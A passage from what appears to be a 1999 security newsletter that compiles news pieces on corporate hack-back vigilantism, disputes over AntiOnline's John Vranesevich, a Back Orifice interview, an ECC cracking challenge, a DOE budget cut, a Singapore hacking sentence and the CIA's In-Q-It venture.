           identify source IP addresses. But you have to get the assistance of
           ISPs down the line to trace additional hops on the Internet, because
           each hop has to be covered in order to find the real source. That's all
           legal, but you may need to pressure the ISP into working with you
           quickly to identify the next hop in the chain. Once you collect this data,
           it can be handed over to law enforcement officials - who may or may
           not react. 

      In 1994, Secure Computing, a security vendor in Roseville, Minn., introduced
      Sidewinder, a novel firewall with strike-back capabilities. If it senses an
      attack, it launches a daemon that will trigger the offensive techniques of your
      choice. Other companies indicate they will soon be offering a range of
      strike-back products. 

      A company crosses the line when it responds by unleashing a
      denial-of-service attack against an intruder, as the Pentagon did. This can be
      done via massive e-mail spamming, the Ping of Death and hostile Java applets.

      No matter what offensive mechanism you choose, the trick is to identify the
      culprit before returning fire. Should you fail to recognize that the attacker
      spoofed the identity of another company, you may find yourself attacking J.C.
      Penney, NBC or General Motors. Innocent companies would not take kindly
      to that sort of activity - no matter the reason - and ISPs don't appreciate being
      the vehicle for Internet-based attacks. 

      Indeed, one of the big dangers with corporate vigilantism is how easy it is to
      overreact to an apparent attack. In spring 1997, one of the Big Six accounting
      firms used scanning tools from Internet Security Systems (ISS) to assess the
      security of a major ISP that controlled a huge amount of Internet traffic. 

      When a network administrator on duty at the ISP noticed a thousand
      simultaneous connections to his firewall, he reacted quickly and shut down
      several routers. "His manual reaction took down 75% of the Internet," says
      Tom Noonan, president of ISS. "Anyone using Sprint at that time was in a
      world of hurt." 

      Even those with a strong inclination for vigilantism note that counteroffensive
      responses are fraught with danger. "Talk to your lawyers," Troy Systems'
      Reese advises. "Keep in mind that your strike back has to go through a long
      path, and you might do damage at any place along the way." Retribution can
      cause a hair-trigger response that could cause damage to systems in the path
      from you to the attacker. 

      "You really have to understand what you're doing," says Ray Kaplan, a senior
      information security consultant with Secure Computing. "Your first response
      might invite further attack, exactly the opposite of what you intended. You
      have to consider your firm's public relations posture and how the Internet
      community as a whole will react to your actions." 

      Don't ask, don't tell

      As for how law enforcement will view vigilantism, the answer from many
      companies is a resounding, "Who cares?" 

      Vigilantism is emerging as a response to the intense frustration people feel
      with law enforcement authorities they view as simply not up to snuff.
      Complaints from top firms in the U.S. range from downright ineffectiveness
      ("clueless" is an oft-repeated word) to a lack of staff, lack of funding, courts
      that are too crowded with cases and the snail-like speed at which typical law
      enforcement investigations run. 

      "One reason you see vigilantism is because law enforcement doesn't get the
      job done," says Fred Cohen, president of Fred Cohen and Associates and
      principal scientist at Sandia National Laboratories. "Law enforcement might
      investigate if you have a lot of political clout and you do all of the leg work." 

      Companies are also fearful of what might happen if they do bring in law
      enforcement. "It's a hell of a situation when victim companies are more fearful
      of the FBI than they are of the attackers," says Michael Vlahos, senior fellow
      at the U.S. Internet Council. He echoes the worry that sensitive corporate
      information will not be protected if handed over to law enforcement. 

      "Law enforcement is helpless," ISS's Noonan maintains. "It's not like Israeli
      fighters who train every day for every contingency. Conventional law
      enforcement just can't match the skills needed. Besides, you can't trust law
      enforcement to keep your secrets from becoming public knowledge." 

      Predictably, law enforcement does not favor the vigilante view - at least
      publicly. "If someone were to attack us, we are not encouraged to swat back,"
      says Lt. Chris Malinowski of the New York Police Department, who
      specializes in cybercrime. "If companies take any of these proactive defensive
      steps, they are taking a big chance, subject to criminal prosecution." 

      Dave Green, deputy chief of the Computer Crimes and Intellectual Property
      Section for the U.S. Department of Justice, says he relates to the frustration
      over law enforcement's inability to respond, but adds that his department can
      only recommend protective measures. Yet he stops short of advising against
      corporate vigilantism outright. When asked if companies should hack back at
      attackers, Green responds, "no comment," as he does to questions as to what
      could legally be considered an attack. "But I can say that law enforcement is
      gearing up and is much better equipped to deal with cybercrime," he adds. 

      When they are not speaking for attribution, law enforcement authorities of all
      stripes go further than Green. Local police, state police, the FBI, Secret
      Service, Interpol and Scotland Yard members all say the same thing -
      unofficially: "We can't handle the problem. It's too big. If you take care of
      things yourself, we will look in the other direction. Just be careful." 

      Security consultant Lobree seems to understand the police mentality and
      applies the red light theory to cybervigilantism. "Suppose it's the dead of night
      on a country road, and you come upon a stop light. You can see for miles in all
      directions. Are you going to run the light even knowing there is virtually no
      chance of being caught?" Some, perhaps most, won't, because they have an
      innate fear of being caught. Others will forge ahead. "A lot of companies
      recognize that the chance of getting caught in a vigilante cyberstrike is pretty
      darn low," he says. 

      It's your call

      A number of sources suggest vigilantism might be a business opportunity for a
      firm that wants to specialize in counteroffensive network security. "In the
      1860s, law enforcement was conducted by Pinkerton, a private company,"
      Vlahos says. Many suggest that privatization should be the case in the
      cyberworld as well. The kind of offensive network security products needed
      to make it happen are starting to find their way into corporate tool kits and
      onto the Internet. 

      But the legal challenges that coexist with hostile perimeters and
      counteroffensive measures are daunting. The astute company will examine
      every aspect of its posture before marching down the slippery slope of
      vigilantism. Sometimes the best defense is not to overreact. In the worst case,
      do nothing until a proper response can be developed. Vlahos says courts may
      be the place to create new laws more attuned to the technology. "This is a
      whole new arena, and I don't know how we can explore it without trying new
      approaches, even if they are technically illegal." 

      Cipher, the baseball-bat-bearing vigilante, is all for new approaches. "Personal
      persuasion is always more effective than electronic persuasion," he says.
      "Personal persuasion virtually guarantees that a hacker will see the error of his
      ways, scamper to please and turn over a new leaf." 

      No matter what path you choose, make sure it is well thought out and that you
      have your legal ducks in a row. You just might need them.

      Forbes;
      
      IT'S A SAD FACT, but whenever someone is cited as an expert in one publication, he is almost sure to be 
      quoted in another--and another and another. The reason is simple: The first thing a journalist does when
      beginning a story is to see what else has been written on the topic. Culling sources from other news 
      articles is a good way to get started.

      The problem is, few reporters check out these "experts," figuring that if a source made it into, say, 
      The New York Times or The Washington Post, he must be reliable and, well, expert. Think of it as an 
      extension of Howard Stern's media strategy. Stern once said he himself first coined the term "King of All 
      Media," figuring that the mainstream press would then start to call him that. (It did.)
 
      How else to explain the schizophrenic emergence of twenty-year-old John Vranesevich, founder and operator
      of antionline.com, a web site that purports to follow the hacker scene. In the realm of mass media, "JP" 
      has become a star, a youthful public figure who has been quoted extensively for his computer-security 
      expertise and inside knowledge of the hacking world.

      But in hacker circles he is a pariah. Perhaps only his close ally, Carolyn Meinel (a.k.a. "The Happy Hacker"),
      inspires more vitriol. At this year's Defcon, the hacker conference held in Las Vegas, Meinel had the dubious
      honor of being bodily ejected from the convention hall.

      It's hard to gauge just how elite JP's hacker and computer-security skills are. But we do know his web site was
      taken down in August when someone with an account in Russia tricked AntiOnline into downloading software that 
      redirected its visitors to another site. The hacker, obviously not a fan of JP's, included this message: 
      "Expensive security systems do not protect from stupidity."

      And online columnist Lew Koch, of CyberWire Dispatch, interviewed JP at length, exposing vast gaps of knowledge.
      For instance, Koch questioned JP about AntiOnline's alleged scoop of the hack of an atomic research center last
      year, yet he couldn't remember which country housed the center. JP kept insisting it was Israel, and, according
      to Koch, called the Bombay Atomic Research Center the "B'Hadvah Atomic Research Center." When Koch corrected 
      him, JP admitted it must have been India. JP also claims he has "semi-contractual" relationships with NASA and
      the Defense Informations Systems Agency (DISA), yet Koch says both agencies deny this.

      But the mass media appears ignorant of this. The New York Times turned to Vranesevich when it needed comment on
      a rash of anti-government hacks, while The Wall Street Journal Europe dubbed him an "online-security specialist."
      
      The Baltimore Sun asked for his opinion on the hack of the Johns Hopkins' medical school site. The Orange County
      Register invited him to bash hacker/martyr Kevin Mitnick, which he did with glee, saying that hackers don't have
      a clue about Mitnick's case, they "just heard it's cool to support Mitnick, and that is what they do." And the 
      San Diego Union-Tribune dialed him up to ask about the threat of computer viruses.

      Of course, JP has nothing against good press. It's the bad press that let's him unsheath his sharpest weapon. No,
      not the facts; those would only get in the way. We're talking about the threat of a lawsuit.

      In June, JP contacted Harvard University to complain about a computer-security web site rival called PacketStorm, 
      which had posted some nasty pictures, along with even nastier commentary. Harvard, afraid of a lawsuit, pulled the
      site, which was a favorite of computer-security professionals. JP claims on his web site that he didn't explicitly
      threaten lawsuit, but the University certainly took it that way. A Harvard spokesman told me this was the first 
      time Harvard had ever pulled the plug on a site for "objectionable material." (Eventually, PacketStorm found a home
      with Kroll-O'Gara, the big-time detective agency in New York.)

      Then in July, The Ottawa Citizen ran a story about JP, reporting allegations that JP is under investigation by the
      FBI for "employing hackers to target high-profile sites in order to scoop the rest of the media with exclusive 
      reporting." Vranesevich contacted the newspaper and threatened to sue. Although Mark Anderson, The Citizen's high 
      tech editor, said he was confident in the story, the FBI would not comment whether it was in fact investigating JP
      or not, even though several other sources in the know insisted he was. As a result, the Citizen removed the story
      from its web site, rather than face a potential lawsuit.

      "It's sad," Anderson says. "You're confident you have reliable information, but the threat of a lawsuit forces you 
      to pull your story. The onus was on us to prove that Vranesevich is under investigation by the FBI, but the FBI 
      wouldn't say it outright. Since Canadian libel law is tougher than American libel law, we felt we had no choice."

      In addition, folks trolling around cyberspace say that Vranesevich has threatened them with lawsuits whenever they 
      post anything negative about him on their web sites. I wonder what he would do if someone actually took him up on 
      this, since lawyers are expensive and, by all accounts, JP's business is far from being a cash cow. Perhaps, after
      reading this, he'll even sue  me.

      CyberWire Dispatch // August 1999

      Jacking in from the "Pine-Sol" port:
      By Lewis Z. Koch
      CWD Special Correspondent

      Twenty-year-old John Vranesevich calls his AntiOnline
      Web site "a valuable tool in the fight against 'CyberCrime'"
      In a call to arms, this self-anointed, junior G-man
      wannabe, promises to uncover, reveal and inform on
      hackers and other miscreants. 

      Out of this misguided cyber-vigilantism, arises the
      "denunciator" virus, which reaches its full lethality in
      totalitarian states but also finds a home in democratic
      societies as well, usually in climates of social resentment,
      political fanaticism, or, my personal favorite, political
      self-righteousness.

      The Denunciator virus, known also as the "Accuser" virus,
      destroys careers, leaves permanent scars, called
      "blacklists," gives rise to false alarms, warnings or
      contrived "cautionary tales" meant to lull or divert
      citizens. The natural host for this virus is believed to be a
      species of the rodent called a "snitch," aka squealer, stool
      pigeon, informer; rat bastard.

      Every delusional crusader needs a mission statement,
      Vranesevich is no different. This self-anointed
      sheriff-of-cyberspace pens this Uber-warning to hackers:

      "I know that some of you are playing what you feel is a
      game. A game that you think you are winning. Some of
      you sit back and laugh at organizations like the FBI. You
      make sure that you provide enough information to make it
      obvious who you are, yet are careful not to provide
      enough information to actually have it proven. I have
      been watching you these past 5 years. I know how you
      do the things you do, why you do the things you do, and I
      know who you are."

      And if you're keeping score-and you should be-you'll note
      that Vranesenvich apparently started down this crusader
      road at the tender age of 15 or just about the time he
      figured his Johnson could be used for more than simple
      utilitarian bodily functions. 

      This not-very subtle paean to cyber-vigilantism could
      easily be dismissed save for the fact that Vranesenvich
      has earned a demi-celebrity status from journalists
      working for publications from which we have come to
      expect more judicious sourcing, including, but not limited
      to, Matt Richtel of The New York Times, John Schwartz of
      The Washington Post and even, sadly, CWD's own Brock
      Meeks while cloaked in his alter-ego as Washington
      correspondent for MSNBC.

      And we wonder why fewer and fewer people trust the
      media.

      Hung With His Own Rope
      =====================

      In his mission statement Vranesevich unequivocally
      states, "I've seen myself talking with people who have
      broken into hundreds of governmental servers, stolen
      sensitive data from military sites, broken into atomic
      research centers."

      Question is, can we believe him?

      There's his rather perplexing story about hackers breaking
      into an "Israeli" atomic research center. 

      At first, as Vranesevich tells it, when hackers told him
      what they had done, he "freaked" even thought the boast
      might be "far fetched." But these hackers sent him a
      "folder full of documents written in a foreign language"
      they claimed they had copied from the "B'Hadvah" Atomic
      Research Center. [Note: Vranesevich didn't know how to
      spell the name of the so-called research center].

      "Were the documents in Hebrew or English?" I asked.

      "Bengali."

      When he broke the "story" on his AntiOnline web site, all
      media hell broke loose. 

      "Every mainstream media started calling and questioning
      and calling the research center," Vranesevich said. "I had
      all these nuclear arms proliferation people calling. Here I
      am in my parent's living room, and one day, thirteen calls
      from anti-nuclear proliferation and pro-nuclear proliferation
      (sic) groups wanting to know - is this significant, what is
      Israel doing?"

      I was still having a problem with the "Bengali" aspect to
      the documents.

      "Ah, John," I asked, "is this an Israeli research center or
      could it be Indian? Pakistani?"

      Silence. Then Vranesevich said, "I think it's Indian. Who
      was the one that just did the nuclear testing?"

      "That was India and Pakistan, not Israel."

      "Oh, then this was India, not Israel."

      Oh. 

      Then there's his story about changing medical
      records-pretty serious stuff. Can we take him at his word
      there?

      "[I]'ve seen people change the medical records of
      individuals in our armed services" Vranesevich asserts in
      his "mission" statement. 

      When asked about these nefarious deeds, Vranesevich
      works himself up into a high dudgeon about hackers
      breaking into sites and changing medical records.

      "What would have happened if medical records had been
      changed and a cancer patient received the wrong
      treatment for it?...What if I had looked into who these
      [hacker] guys were, a little further? What would have
      happened if I would have published the story? What would
      have happened if CERT had come out and said medical
      records had been changed and a cancer patient received
      the wrong treatment because of it!" 

      I questioned him closely. "You really saw people change
      the medical records of individuals in our armed forces?" 

      "I don't mean that literally," backtracking as fast as his
      voice could carry him. "You see the language I was using?
      I don't mean literally 'I saw them do it, I saw it happen.'
      It's something that transgressed (sic) before. It's like we
      saw our country go through three wars. It doesn't mean I
      caused (sic) the three wars. You see what I'm saying? Or
      I've seen crime happen over and over again in my
      neighborhood. Doesn't mean I literally saw it. You know
      what I mean? I don't know if I'm making myself clear." Ah,
      er.. right. He gave it one more chance.

      "Looking back in retrospect (sic). It was like actions that
      transgressed (sic) before. I've sort of watched the events
      transfold (sic) before my eyes."

      Yep, that clears it up; someone get this guy an English
      tutor...There's more like that but after a while it gets,
      well, boring.

      Vranesevich also claims a "semi-contractual" relationship
      with all kinds of official military and police types, including
      one with the NASA and one with the Defense Information
      Systems Agency (DISA). 

      Can we believe him? 

      NASA says no. After checking with their databases "they
      could find no record of NASA having done business with
      Mr. Vranesevich or his company AntiOnline," reports
      Patricia M. Riep-Dice, NASA Freedom of Information Act
      Officer. 

      According to a DISA spokesman, no such relationship
      exists. None. Nada.

      In Other People's Words
      =======================

      In his grasp for distinction, celebrityhood, acclaim,
      Vranesevich overreaches, as he did with his claim of
      unethical behavior on the part of computer security expert
      Marcus Ranum. Ranum's "crime"? "Guilt-by-association"
      with two hacker groups, L0pht Heavy Industries and cult
      of the Dead cow (cDc).

      L0pht Heavy Industries is among the finest Microsoft
      error-catchers in the world; it is a company with
      employees and it pays taxes. "cult of the Dead cow" is a
      group of hackers in the tradition of Yippie founders Abbie
      "Steal This Book" Hoffman and Jerry Rubin.

      The cDc promises Internet chaos, anarchy and terror; in
      1968, in Chicago, Abby Hoffman and Jerry Rubin
      threatened to pour LSD in the water and send Yippie
      studs to O'Hare airport to seduce the wives of delegates
      to the Democratic National Convention. If that analogy is
      lost on you, cut your losses now, stop reading and return
      to your "Internet for Dummies" workbook.

      L0pht and cDc tend to despise Microsoft, but then so do a
      lot of people, including folks in the Justice Department.
      More than likely there is cross-over contact between
      L0pht and cDc since the two have much in common, in
      the same way journalists from different newspapers and
      television tend to hang out at the same bars, buy each
      other drinks and complain about stupidity and venality of
      their editors.

      cDc had been tinkering around the multiplicity of holes,
      vulnerabilities and general screw ups in the Microsoft
      Windows operating system. They developed a
      back-dooring program for Win 95, one that allowed a
      Trojan Horse to exploit that vulnerability. 

      In a stroke of genius that would make an Wizard of
      Madison Avenue green with envy, they dubbed the
      program "Back Orifice." 

      Ranum developed a program to counteract Back Orifice
      and called it "Back Officer Friendly." Vranesevich claims he
      was "shocked, shocked" to discover that Ranum might
      have had conversations with hackers at L0pht, perhaps
      even some at cDc about Back Officer Friendly.

      Vranesevich's story alleged that Ranum could have even
      been talking with the very people at cDc who developed
      the exploit in the first place. So what do we have here?
      Collusion? Duplicity? Ethical lapse? Double-agentry?

      Whom to believe?
      ================

      Bell Labs' William R. Cheswick, co-author with Steven
      Bellovin of the exemplary "Firewalls and Internet Security -
      Repelling the Wily Hacker," says of Ranum: "I have worked
      with Marcus for years. He is a strong force for Good
      against Evil. A security person is paid to think bad
      thoughts, and Marcus is quite good at it. The key is that
      he doesn't do the bad stuff, but uses this approach to
      make things safer." 

      Bellovin, himself a world-class computer expert, certainly
      doesn't equivocate. Ranum has "been a strong, positive
      force for Internet security, both in the sense of building
      useful tools and in the sense of teaching other people
      important principles. I've also never heard any serious
      question about his ethics." 

      "Marcus has one of the most fluent understandings of
      Internet security I have ever seen," says Bruce Schneier,
      whose books on encryption and on privacy can trigger a
      physical and intellectual hernia, "his ability to see threats
      and attacks, defenses and countermeasures, makes him
      one of the most valuable resources we have in computer
      security world," Schneier said. Marcus' "association with
      the L0pht recognizes that there is considerable expertise
      in the hacking community that can be leveraged in the
      fight against computer crime. Marcus is just smarter than
      other people, because he realized it and figured out how
      to use it No kidding; he's that good." 

      So you do the math: self appointed cybervigilante John
      Vranesevich, with his stolen "Israeli" atomic secrets
      written in Bengali, changed medical records that weren't
      changed, unsubstantiated relationships with NASA and
      DISA (and that's just for openers), and, on the other
      hand, Marcus Ranum and people like Cheswick, Bellovin,
      and Schneier.

      The best way to deal with "Denunciator" virus is simply
      silence; don't feed the hype.

         In the murky world of hackers and crackers, appearances can be deceptive. "White hat" good guys,
         working for software or security firms, have occasionally been caught moonlighting as "black hat"
         rogues.
         
         Such appears to be the case with John Vranesevich, a network security expert and founder of top-rated
         hacker Web site AntiOnline. Mr. Vranesevich is currently under investigation by the FBI with regard
         to recent attacks on U.S. government Web sites. It is alleged that he may have employed hackers to
         target high profile sites in order to scoop the rest of the media with exclusive reporting.
         
         Mr. Vranesevich has denied the allegations.
         
         Brian Martin, also under FBI investigation for hacking, recently released a report on his Web site
         (www.attrition.org/negation/special) which details a series of links between Mr. Vranesevich and an
         alleged member of the hacker group Masters of Downloading, which claimed responsibility for the U.S.
         Senate Web site hack earlier this month.
         
         Mr. Martin, who researches hacker culture through his Web site, claims to have been tracking
         questionable AntiOnline reporting over the past year.
         
         Mr. Vranesevich, 20, has over the past couple of years become one of the most widely quoted and
         authoritative sources on hacking and security-related information.╩Begun in late 1994 as a 5-megabyte
         high school hobby Web site, AntiOnline has since grown into a multi-domain business venture.
         
         ABC News has described it as a "Rick's Cafe in the Casablanca world of hacking."╩Besides reporting on
         hacking news, the site offers a downloadable library of hacking software tools, archives of several
         hacker newsletters and journals, and copies of some of the hacked pages featured in reported stories.
         
         While growing increasingly popular with the mainstream media, however, Mr. Vranesevich has slowly
         built up a number of enemies among the hacker underground.
         
         Spurred, perhaps, by an extensive FBI and U.S. Department of Justice hacker crackdown, which resulted
         in raids on 20 suspected hackers across six states, Mr. Vranesevich declared a dramatic change of
         stance, distancing himself from the subjects he covers.
         
         In a "Change in Mission" notice posted on his Web site, Mr. Vranesevich said: "Unfortunately, I've
         found myself looking in the mirror with disgust these past few months. Looking back, I've seen myself
         talking with people who have broken into hundreds of governmental servers, stolen sensitive data from
         military sites, broken into atomic research centres, and yes, people who have even attempted to sell
         data to individuals that presented themselves as being foreign terrorists ╔ Many times, I knew about
         these instances before hand, and could have stopped them."
         
         He also claimed to have been secretly working with the U.S. Airforce to develop a "profile of a
         hacker" for use in fighting "CyberCrime".
         
         Mr. Vranesevich's message concluded with a note to the thousands of hackers who read his site: "You
         yell and scream about freedom of speech, yet you destroy sites which have information that disagree
         with your opinions.╩You yell and scream about privacy, yet you install trojans into others' systems,
         and read their personal email and files. You truly are hypocrites.╩All of these grand manifestos that
         you develop are little more than excuses that you make up to justify your actions to yourself."
         
         Mr. Martin, on the other hand, alleges that many of the reports from AntiOnline, and subsequent
         follow-on reporting in other media outlets, have been exaggerated and sensationalized.
         
         "Not only had AntiOnline driven the media hype behind the stories, they put various government and
         Department of Defense organizations on full alert preparing for the fallout these attacks would
         cause," he states on his own Web site.
         
         In detailing the relationship between Mr. Vranesevich and the alleged hacker in questions, Mr. Martin
         notes that "the typical journalist/contact relationship did not exist, and in fact, AntiOnline may
         have been responsible for creating some of the news to report on ╔ he pays people to break into sites
         in order to report on it as an exclusive."

      How Bad Is Back Orifice? 

      Hacker tool is only as malicious as the hands it
      falls in--but Windows users beware.

      by Ann Harrison, Computerworld 
      September 28, 1999, 8:22 a.m. PT 

      Is Back Orifice simply a cool hacking tool or a
      malicious weapon? Depends on who you ask. Some
      people think the remote administration tool for
      Microsoft Windows is not as malicious as it's made out
      to be. Bruce Schneier, chief technology officer at
      Counterpane Internet Security, is one of them.

      Computerworld reporter Ann Harrison spoke with him
      recently about the free open source tool, which he
      insists has gotten an undeservedly bad reputation.

      Q: How does BO2K work?

      A: There are two parts: a client and a server. The server
      is installed on the target machine. The client, residing
      on another machine anywhere on the Internet, can now
      take control of the server.

      Perfectly respectable programs, like pcAnywhere or
      Microsoft's Systems Management Server [SMS], do
      the same thing. They allow a network administrator to
      remotely troubleshoot a computer. If the server is
      installed on a computer without the knowledge or
      consent of its owner, the client can effectively "own"
      the victim's PC.

      Q: Why has BO2K acquired a reputation as only a
      hacker's tool?

      A: Back Orifice's difference is primarily marketing spin.
      Since it was written by hackers, it is evil. That's wrong;
      pcAnywhere is just as much an evil hacking tool as
      Back Orifice. Not only can the client perform normal
      administration functions on the server's computer, but it
      can also do more subversive things: reboot the
      computer, turn the microphone or camera on and off,
      capture passwords.

      Q: How does BO2K run in stealth mode?

      A: Unless the server's owner is knowledgeable, and
      suspicious, he will never know that Back Orifice is
      running on his computer. Other remote administration
      tools, even SMS, also have stealth modes. Back
      Orifice is just better at it. Back Orifice will be used by
      lots of unethical people to do all sorts of unethical
      things.

      Q: Back Orifice can't do anything until the server
      portion is installed on some victim's computer, right?

      A: Yes. This means that the victim has to commit a
      security faux pas before anything else can happen. Not
      that this is very hard; lots of people network their
      computers to the Internet without adequate protection.
      Still, if the victim is sufficiently vigilant, he can never be
      attacked by Back Orifice.

      Q: What about Microsoft?

      A: One of the reasons Back Orifice is so nasty is that
      Microsoft doesn't design its operating systems to be
      secure. It never has. You have to make 300-plus
      security checks and modifications to Windows NT to
      make it secure. Microsoft refuses to ship the [operating
      system] in that condition.

      Malicious remote administration tools are a major
      security risk. What Back Orifice has done is made
      mainstream computer users aware of the danger. There
      are certainly other similar tools in the hacker world,
      some developed with much more sinister purposes in
      mind.

      Microsoft responds to security threats only if they are
      demonstrated. Explain the threat in an academic paper
      and Microsoft denies it; release a hacking tool like
      Back Orifice and suddenly they take the vulnerability
      seriously.

22.0  97bit ECC Stronger than 512bit RSA

      A group of international researchers, using
      approximately 195 computers from all over the world,
      after 40 days of computation, has been awarded 1st
      prize in the latest round of the Certicom ECC Challenge
      for successfully recovering a 97-bit ECC key. Results
      bolster Certicom, ANSI X9, and NIST's recommendation
      that strong security can only be achieved by using a
      minimum of a 163-bit ECC key. Furthermore, result data
      proves that the 97-ECC is harder to crack compared to
      the 512-bit RSA which can still be found on many
      commercial products today.

              Global team cracks crypto
                         challenge
                          By Stacy Collett


       An Irish mathematician and his team have cracked the
       seventh and toughest encryption problem as part of a
       challenge by Canadian firm Certicom Corp. to prove that
       one type of encryption is tougher to break than another. 

       The challenge involved 97-bit elliptic curve cryptography vs.
       512-bit RSA (Rivest-Sharmir-Adleman), a more common
       encryption method. 

       The solution was discovered by 195 volunteers in 20
       countries after 40 days of calculations on 740 computers,
       Irish mathematician Robert Harley said in a statement.
       Solving the problem used approximately 16,000 MIPS-years
       of computing, twice as much as solving a 512-bit RSA
       problem, officials said. One MIPSyear is the computing
       power of one system that can crunch a million instructions
       per second running for a full year. 

       The team concluded that the elliptic curve encryption was
       tougher to crack, but debate continues within the security
       community on the issue. 

       Certicom launched a series of increasingly difficult
       cryptography problems in November 1997 with prizes worth
       up to $100,000. Andrew Odlyzko, head of mathematics and
       cryptography research at AT&T Labs said the test
       "demonstrates the need to keep increasing cryptographic
       key sizes to protect against growing threats."

      DOE Loses $35 Million for Cyber Security

      By Walter Pincus and Vernon Loeb
      Washington Post Staff Writers
      Wednesday, September 29, 1999; Page A18 

      The Senate yesterday passed an energy appropriations bill that omits $35
      million requested by Energy Secretary Bill Richardson for increased
      computer security. The money was eliminated despite months of heated
      debate over suspected Chinese espionage, during which leading Republicans
      accused the Clinton administration of foot-dragging on security.

      Richardson, traveling overseas, issued a statement charging that Congress
      was withholding "important tools needed to implement security reform" that
      Congress itself had demanded.

      Without the $35 million, Richardson said, "it will be impossible to provide
      real-time cyber intrusion detection and protection for 70 Energy Department
      sites."

      The money was eliminated by a House-Senate conference reconciling
      differences between the initial versions of the bill passed by the two
      chambers. A member of the conference committee, who requested
      anonymity, said the $35 million was eliminated because members "want to
      see management reform" before they approve a huge funding increase.

      The committee member noted that Richardson is developing a $450 million
      cyber security proposal for fiscal 2001. It would include money to replace all
      personal computers used in classified programs with machines that do not
      have floppy disk drives, and thus cannot easily be downloaded.

      Congress's action leaves the department with the $2 million it originally
      sought for computer security before suspected Chinese espionage came to
      dominate political debate in Washington last spring.

      Cyber security, in particular, became a major concern after it was
      discovered that the government's prime espionage suspect at the Los
      Alamos National Laboratory, Chinese American physicist Wen Ho Lee, had
      downloaded classified information to his unclassified computer. Lee, who
      denies passing secrets to China, was fired but has not been charged with any
      crime.

      Meanwhile, the Energy Department's director of counterintelligence, Edward
      J. Curran, acknowledged yesterday that he recommended his brother, a
      retired police detective, for a $70-an-hour temporary job reviewing
      counterintelligence operations at the department's three nuclear weapons
      laboratories.

      But he said the department's inspector general determined that his
      recommendation did not violate federal conflict-of-interest statutes. "I
      recommended my brother, yes, but he does not work directly for me,"
      Curran said.

      Michael Curran, a veteran of 27 years as a detective for the Waterfront
      Commission of New York Harbor, has participated in a two-week
      counterintelligence inspection at Lawrence Livermore Laboratory National
      Laboratory in California and is now part of a nine-member team reviewing
      security at the Los Alamos lab in New Mexico.

      All told, he will work about six weeks this fall, Edward Curran said, and will
      participate in additional counterintelligence inspections at Energy Department
      facilities next year.

      Teen sentenced for hacking into

      A 15-YEAR-OLD boy was sentenced to 12 months'
      probation and 100 hours of community service by the
      Juvenile Court yesterday for hacking into the Television
      Corporation of Singapore's (TCS) Internet site in June this
      year. 
 
      The boy, who cannot be named, is believed to be the first
      juvenile here to appear in court for such an offence. 
 
      His case came up on the same day The Straits Times
      reported that another TCS website had been hacked into
      early on Monday morning. The culprit in the second
      hacking has not been caught yet. 
 
      District Judge Mark Tay Swee Keng stressed that the
      court took a serious view of such cases. However, in
      view of the boy's background -- he neither drinks alcohol,
      smokes nor takes drugs, and also does not keep late hours
      -- a bond would not be imposed on his parents. 
 
      His father is a product engineer and his mother is a
      housewife. Both were in court yesterday. The judge did
      not impose any curfew on the boy, who goes to a
      neighbourhood school. He said the parents were already
      ensuring that he got home by 6 pm. 
 
      The court heard that TCS had asked the boy to apologise
      in writing and the apology has been posted on the TCS
      site. Last month, the boy, a Myanmar national, had
      pleaded guilty to four counts of unauthorised entry and
      password disclosure. 
 
      The court had earlier heard that on June 15 this year, the
      Secondary 2 boy was watching TV at home when he saw
      an advertisement showing the address
      www.mediacity.com.sg 
 
      He decided to visit the website and then tried various user
      names and passwords to get into the Mediacity server. 
 
      He succeeded when he used "news" as the user name
      and password. He then started exploring the directories
      and files. 
 
      Then he told an 18-year-old youth whom he had met
      chatting on the Internet, that the server had security
      weaknesses and gave him the password. The older boy,
      an O-level student in a private school, logged on too. 
 
      The younger boy then found a file containing all the
      authorised user names and their corresponding encrypted
      passwords. He passed them on to the older boy and both
      used them. 
 
      The court heard that the younger boy only browsed
      through the site. The older boy's case is pending. 
 
      Due to the hacking, TCS, which reported that some of its
      pages had been replaced by pages containing obscene
      words, had to shut the server down for about 10 hours.
      About 80 man-hours went into restoring the site.

      From Time to Time: Nando's in-depth look at the 20th century 
      
      By TOM RAUM 
      
      WASHINGTON (September 29, 1999 12:09 p.m. EDT http://www.nandotimes.com) - The CIA, not wanting to miss the boat on the Internet age or be outsmarted
      by tech-savvy adversaries, is teaming up with Silicon Valley entrepreneurs to invest in companies developing computer technologies that could help with
      intelligence gathering. 
      
      Forgoing its usual clandestine ways, the agency has set up its own venture capital firm - with money appropriated by Congress - with offices in
      Washington and Palo Alto, Calif. It will invest in promising new start-up hi-tech companies. 
      
      The CIA picked a fanciful name for the new company: In-Q-It. The "In" stands for intelligence. The "It" stands for information technology. And the Q?
      That's the code name of the James Bond character who comes up with all the gadgets that the fictional British spy uses. 
      
      "We do have a sense of humor," Central Intelligence Agency spokesman Bill Harlow said Wednesday, confirming the existence of the new company. 
      
      Harlow said the venture capital company "is clearly tied to us, but they make a big point of being independent." 
      
      The venture, first reported by The Washington Post and The New York Times in Wednesday's editions, was actually set up last February as a nonprofit
      organization. 
      
      But it is just now getting organized, with its own board of directors, according to the new chief executive officer, Gilman Louie. 
      
      Louie said in an interview that the company would be small, with about 20 to 25 employees, and is being started with $28 million appropriated by
      Congress last year as part of the classified budget for the agency. 
      
      Both Louie and the CIA said the venture capital company would only work on unclassified projects. 
      
      Mainly, In-Q-It will invest in some high-tech companies and form joint ventures with other ones where the companies are working on promising
      technological projects that could benefit the CIA. 
      
      This includes ways of helping the CIA to use the Internet more effectively and securely. 
      
      It also will try to find promising technologies that will help the CIA better use the information it already possesses in a variety of forms, from paper to
      computer files. 
      
      He cited the May 7 bombing of the Chinese embassy in Yugoslavia - a target picked by the CIA - as "the manifestation of the worst result that could
      happen if you don't have all your information lined up." 
      
      Louie, 39, founded his own electronic game company - MicroProse Inc. - that was later bought by Hasbro. At Hasbro, Louie has been an executive with
      the toy company's online business group. 
      
      He said he has no experience in espionage "and I want to keep it that way." 
      
      The company's board of directors includes John Seely Brown, director of the Xerox Corporation's Palo Alto Research Center; Norm Augustine, chairman
      of Lockheed Martin; William Perry, the former defense secretary; and Jeong Kim of Lucent.

      Valley VCs to CIA: 'Huh?'

      12:30 p.m.  29.Sep.99.PDT
      The CIA's new venture capital project isn't going to come up with anything that the free market won't do on its own. 
      
      That's the opinion of venture capitalists and policy watchers, some of whom lampooned a new effort to develop spy technology in the heart of
      regulation-wary Silicon Valley. 
      
      
      "I am not familiar with what it costs to create those exploding pens," Benchmark Capital general partner Kevin Harvey said. 
      
